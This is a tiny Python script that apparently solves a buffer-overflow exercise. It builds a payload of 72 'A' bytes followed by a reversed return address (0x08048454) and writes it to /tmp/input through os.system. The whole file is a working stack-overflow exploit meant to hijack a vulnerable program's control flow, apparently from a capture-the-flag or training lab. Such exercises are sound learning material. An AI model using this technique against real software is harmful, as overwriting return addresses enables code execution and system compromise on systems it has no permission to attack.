#!/usr/bin/python

import os

nAddr = "\x08\x04\x84\x54"[::-1]
payload = 72*"A" + nAddr
cmd = "echo \"" + payload + "\" > /tmp/input"
os.system(cmd)
